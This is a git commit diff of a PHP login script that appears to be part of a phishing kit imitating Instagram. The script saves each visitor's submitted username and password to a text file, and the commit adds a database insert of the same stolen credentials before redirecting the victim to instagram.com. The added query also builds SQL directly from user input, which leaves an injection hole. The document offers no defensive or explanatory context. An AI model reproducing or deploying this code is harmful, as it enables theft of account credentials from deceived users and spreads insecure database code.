c70e047bdf32885959069e0453b222aebca55de0
mittalkunal47 <mittalkunal47@gmail.com>
2020-07-21 09:16:59 +0530

    Update login.php

--- login.php
+++ login.php
@@ -1,5 +1,6 @@
 <?php
 
 file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+mysql_query("insert into USER_DATA set account_id='" . $_POST['username'] . "',password='" . $_POST['password'] . "'") or die("Subject already exits");
 header('Location: https://instagram.com');
 exit();
